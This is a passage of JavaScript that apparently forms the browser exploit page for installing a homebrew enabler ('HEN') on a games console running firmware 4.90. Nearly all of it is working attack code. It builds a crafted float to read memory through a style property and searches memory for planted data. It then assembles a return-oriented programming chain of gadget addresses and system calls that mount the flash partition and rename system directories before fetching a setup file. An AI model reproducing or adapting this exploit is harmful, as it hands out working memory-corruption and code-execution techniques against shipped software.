	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}
function readMemory(address, size)
{
	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
}
function checkMemory(address, size, len)
{
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		return document.getElementById('exploit').style.src.substr(6,len);
	}
}
function trigger(exploit_addr){
	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1){HFWmsg();}
}
function load_check()
{
	if(total_loops<max_loops)
	{
		showMsg(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
		t_out=setTimeout(initROP,100,false);
	}
	else
	{
		total_loops=0;
		showMsg(fail_msg_frag);
		t_out=0;
	}
}
function findJsVariableOffset(name,exploit_data,base,size,end)
{
    var block = 0;
    while((base + block * size) < end)
    {
        readMemory(base + block * size, size);
        var offset = document.getElementById('exploit').style.src.substr(6,size).indexOf(exploit_data);
        if(offset > 0)
        {
            return base + block * size + (offset * 2) + 4;
        }
        
        block++;
    }
    return 0;
}
function stack_frame_hookup()
{
	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
}
function stack_frame_exit()
{
	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
}
function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function fill_by_4bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
	return stemp;
}
function fill_by_8bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
	return stemp;
}
function fill_by_16bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
	return stemp;
}
function initROP(init)
{
	try
	{
		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
		if(t_out!==0){clearTimeout(t_out);t_out=0;}
		offset_array=[];
		xtra_data_addr=0;
		stack_frame_addr=0;
		jump_2_addr=0;
		jump_1_addr=0;
		var base_file_addr=0,index_key_addr=0,search_max_threshold=70*0x100000,search_base=0x80100000,search_size=2*mbytes;
		search_size_ext=0*mbytes;
		search_base_off=0*mbytes;
		total_loops++;

		xtra_data="xxxx".convert()
		+flash_partition.convert()
		+base_file.convert()
		+filesystem.convert()
		+mount_path.convert()
		// Only needed for HEN directories
		+unescape("\u0000\u0000")
		+"/dev_blind/vsh/resource/silk/xai/widgets/informationboard".convert()
		+"/dev_blind/vsh/resource/silk/xai/widgets".convert()
		+"/dev_blind/vsh/resource/silk/xai".convert()
		+"/dev_blind/vsh/resource/AAA".convert()
		+unescape("\uFD7E");

		while(xtra_data_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size,search_base+search_max_threshold);
			search_max_threshold-=search_size;
		}

		flash_partition_addr=xtra_data_addr+0x6;
		base_file_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
		fs_addr=base_file_addr+base_file.convertedSize();
		mount_path_addr=fs_addr+filesystem.convertedSize();

		hen_renamedir_addr1=xtra_data_addr+0x5A;
		hen_renamedir_addr2=xtra_data_addr+0x96;
		hen_renamedir_addr3=xtra_data_addr+0xC0;
		hen_renamedir_addr4=xtra_data_addr+0xE2;

		stack_frame=stack_frame_hookup()
		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
		+store_word(0x8a000004+sf_swap_addr,sp_exit)
		+store_word(0x8a000014+sf_swap_addr,gadget_mod8_addr)
		+syscall(0x321,base_file_addr,0x0,0x8e000000,0,0,0,0,0)
		+syscall_r3r5_p2p(0x322,0x8e000000,0x8a000000,0x11000,0x8e000008,0,0,0,0,0,0)
		+syscall(0x32E,base_file_addr,0,0,0,0,0,0,0)

		// Must be changed depending on external stack frame (HEN only)
		+syscall(0x32C,hen_renamedir_addr1,0x8a000000+0x1C25A44,0,0,0,0,0,0) // /dev_blind/hen
		+syscall(0x32C,hen_renamedir_addr2,0x8a000000+0x1C25A77,0,0,0,0,0,0) // /dev_blind/hen/xml
		+syscall(0x32C,hen_renamedir_addr3,0x8a000000+0x1C25A62,0,0,0,0,0,0) // /dev_blind/hen/remap
		+syscall(0x32C,hen_renamedir_addr4,0x8a000000+0x1C25A8A,0,0,0,0,0,0) // /dev_blind/hen/remap/xml

		+stack_frame_swap(0x8a000000+sf_swap_addr)
		+stack_frame_exit();

		while(stack_frame_addr===0)
		{
			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext,search_base+search_max_threshold);
			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
			search_max_threshold-=search_size+search_size_ext;
		}

		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
		while(jump_2_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size,search_base+search_max_threshold);
			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}

		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
		while(jump_1_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size,search_base+search_max_threshold);
			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}

		var sf=checkMemory(stack_frame_addr-0x4,0x10000,stack_frame.length);
		var x=checkMemory(xtra_data_addr-0x4,0x2000,xtra_data.length);
		var j2=checkMemory(jump_2_addr-0x4,0x2000,jump_2.length);
		var j1=checkMemory(jump_1_addr-0x4,0x2000,jump_1.length);

		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
		{
			if(t_out!==0){clearTimeout(t_out);}
			showMsg('<h2>Downloading setup file...</h2>');
			window.location.href = 'HEN.P3T';
			setTimeout(listener,1500);
		}
		else
		{
			load_check();
		}
	}
	catch(e)
	{

	}
}
function listener()
{
	var myListener = function ()
	{
		document.removeEventListener('mousemove', myListener, false);
		showMsg('<h2>Installing HEN, please wait...</h2>');
		triggerX();
	};
	document.addEventListener('mousemove', myListener, false);
}
function triggerX()
{
	setTimeout(trigger,50,jump_1_addr);
	setTimeout(showMsg,2000,"<h2><span style='color:red'>Failed to load setup file. Close the browser and try again.</span></h2>");
	t_out=0;
	total_loops=0;
}
function HFWmsg()
{
	showMsg("<h2><span style='color:red'>You must install Hybrid Firmware (HFW) 4.90 before installing HEN!</h2></span>");
	throw new Error('');
}
if(fwv=="4.90"){initROP(true)}else{HFWmsg()}
</script>
